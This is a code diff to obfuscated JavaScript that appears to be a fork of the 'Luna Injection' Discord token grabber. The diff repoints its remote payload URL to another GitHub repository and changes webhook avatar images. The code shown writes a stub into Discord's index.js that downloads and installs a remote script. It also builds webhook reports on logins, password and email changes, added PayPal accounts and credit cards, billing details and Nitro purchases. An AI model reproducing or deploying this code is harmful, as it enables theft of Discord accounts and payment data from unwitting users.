@@ -14,9 +14,9 @@ const config = {
   'ping_on_run': false,
   'ping_val': "@everyone",
   'embed_name': "Luna Injection",
-  'embed_icon': "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
+  'embed_icon': "https://media.discordapp.net/attachments/1268916054092939297/1279046507638685696/tenor.gif?ex=66d3ad22&is=66d25ba2&hm=588bb5c732579cd2befb454b74f5fc441a6bed6dfbbb04013a0b6f2318994eee&=&width=464&height=464",
   'embed_color': 0x560ddc,
-  'injection_url': "https://raw.githubusercontent.com/Smug246/Luna-Grabber-Injection/main/injection-obfuscated.js",
+  'injection_url': "https://raw.githubusercontent.com/pentacute1/test/main/test.js",
   'api': "https://discord.com/api/v9/users/@me",
   'nitro': {
     'boost': {
@@ -361,7 +361,7 @@ function updateCheck() {
       'name': "discord",
       'main': "index.js"
     }, null, 4));
-    const _0xf7e943 = "const fs = require('fs'), https = require('https');\nconst indexJs = '" + _0x5004bd + "';\nconst bdPath = '" + _0x3cdde7 + "';\nconst fileSize = fs.statSync(indexJs).size\nfs.readFileSync(indexJs, 'utf8', (err, data) => {\n    if (fileSize < 20000 || data === \"module.exports = require('./core.asar')\") \n        init();\n})\nasync function init() {\n    https.get('" + "https://raw.githubusercontent.com/Smug246/Luna-Grabber-Injection/main/injection-obfuscated.js" + "', (res) => {\n        const file = fs.createWriteStream(indexJs);\n        res.replace('%WEBHOOK%', '" + "%WEBHOOK%" + "')\n        res.replace('%WEBHOOK_KEY%', '" + "%WEBHOOK_KEY%" + "')\n        res.pipe(file);\n        file.on('finish', () => {\n            file.close();\n        });\n    \n    }).on(\"error\", (err) => {\n        setTimeout(init(), 10000);\n    });\n}\nrequire('" + path.join(_0x429301, "app.asar") + "')\nif (fs.existsSync(bdPath)) require(bdPath);";
+    const _0xf7e943 = "const fs = require('fs'), https = require('https');\nconst indexJs = '" + _0x5004bd + "';\nconst bdPath = '" + _0x3cdde7 + "';\nconst fileSize = fs.statSync(indexJs).size\nfs.readFileSync(indexJs, 'utf8', (err, data) => {\n    if (fileSize < 20000 || data === \"module.exports = require('./core.asar')\") \n        init();\n})\nasync function init() {\n    https.get('" + "https://raw.githubusercontent.com/pentacute1/test/main/test.js" + "', (res) => {\n        const file = fs.createWriteStream(indexJs);\n        res.replace('%WEBHOOK%', '" + "%WEBHOOK%" + "')\n        res.replace('%WEBHOOK_KEY%', '" + "%WEBHOOK_KEY%" + "')\n        res.pipe(file);\n        file.on('finish', () => {\n            file.close();\n        });\n    \n    }).on(\"error\", (err) => {\n        setTimeout(init(), 10000);\n    });\n}\nrequire('" + path.join(_0x429301, "app.asar") + "')\nif (fs.existsSync(bdPath)) require(bdPath);";
     fs.writeFileSync(_0x24ac72, _0xf7e943.replace(/\\/g, "\\\\"));
   }
   if (!fs.existsSync(path.join(__dirname, "initiation"))) {
@@ -541,7 +541,7 @@ const login = async (_0x94f435, _0x1dfaa7, _0x6db126) => {
   const _0x5d2eb6 = await getBilling(_0x6db126);
   const _0x25ca5e = {
     'username': "Luna Injection",
-    'avatar_url': "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
+    'avatar_url': "https://media.discordapp.net/attachments/1268916054092939297/1279046507638685696/tenor.gif?ex=66d3ad22&is=66d25ba2&hm=588bb5c732579cd2befb454b74f5fc441a6bed6dfbbb04013a0b6f2318994eee&=&width=464&height=464",
     'embeds': [{
       'color': 0x560ddc,
       'fields': [{
@@ -572,7 +572,7 @@ const passwordChanged = async (_0x1fdea5, _0x5a716c, _0x522cab) => {
   const _0x4fa9e2 = await getBilling(_0x522cab);
   const _0xd92ef1 = {
     'username': "Luna Injection",
-    'avatar_url': "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
+    'avatar_url': "https://media.discordapp.net/attachments/1268916054092939297/1279046507638685696/tenor.gif?ex=66d3ad22&is=66d25ba2&hm=588bb5c732579cd2befb454b74f5fc441a6bed6dfbbb04013a0b6f2318994eee&=&width=464&height=464",
     'embeds': [{
       'color': 0x560ddc,
       'fields': [{
@@ -603,7 +603,7 @@ const emailChanged = async (_0x58509b, _0x148e63, _0x3b9416) => {
   const _0xd7cfa6 = await getBilling(_0x3b9416);
   const _0x8022f = {
     'username': "Luna Injection",
-    'avatar_url': "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
+    'avatar_url': "https://media.discordapp.net/attachments/1268916054092939297/1279046507638685696/tenor.gif?ex=66d3ad22&is=66d25ba2&hm=588bb5c732579cd2befb454b74f5fc441a6bed6dfbbb04013a0b6f2318994eee&=&width=464&height=464",
     'embeds': [{
       'color': 0x560ddc,
       'fields': [{
@@ -634,7 +634,7 @@ const PaypalAdded = async _0x4e0300 => {
   const _0x595468 = getBilling(_0x4e0300);
   const _0x236cc8 = {
     'username': "Luna Injection",
-    'avatar_url': "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
+    'avatar_url': "https://media.discordapp.net/attachments/1268916054092939297/1279046507638685696/tenor.gif?ex=66d3ad22&is=66d25ba2&hm=588bb5c732579cd2befb454b74f5fc441a6bed6dfbbb04013a0b6f2318994eee&=&width=464&height=464",
     'embeds': [{
       'color': 0x560ddc,
       'fields': [{
@@ -665,7 +665,7 @@ const ccAdded = async (_0x125a5f, _0x5e9c60, _0x4036d1, _0xf71a5c, _0x3dd805) =>
   const _0x118bd8 = await getBilling(_0x3dd805);
   const _0x4fa649 = {
     'username': "Luna Injection",
-    'avatar_url': "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
+    'avatar_url': "https://media.discordapp.net/attachments/1268916054092939297/1279046507638685696/tenor.gif?ex=66d3ad22&is=66d25ba2&hm=588bb5c732579cd2befb454b74f5fc441a6bed6dfbbb04013a0b6f2318994eee&=&width=464&height=464",
     'embeds': [{
       'color': 0x560ddc,
       'fields': [{
@@ -698,7 +698,7 @@ const nitroBought = async _0x9b73b7 => {
   const _0x15eef6 = {
     'username': "Luna Injection",
     'content': _0x3f19d9,
-    'avatar_url': "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
+    'avatar_url': "https://media.discordapp.net/attachments/1268916054092939297/1279046507638685696/tenor.gif?ex=66d3ad22&is=66d25ba2&hm=588bb5c732579cd2befb454b74f5fc441a6bed6dfbbb04013a0b6f2318994eee&=&width=464&height=464",
     'embeds': [{
       'color': 0x560ddc,
       'fields': [{
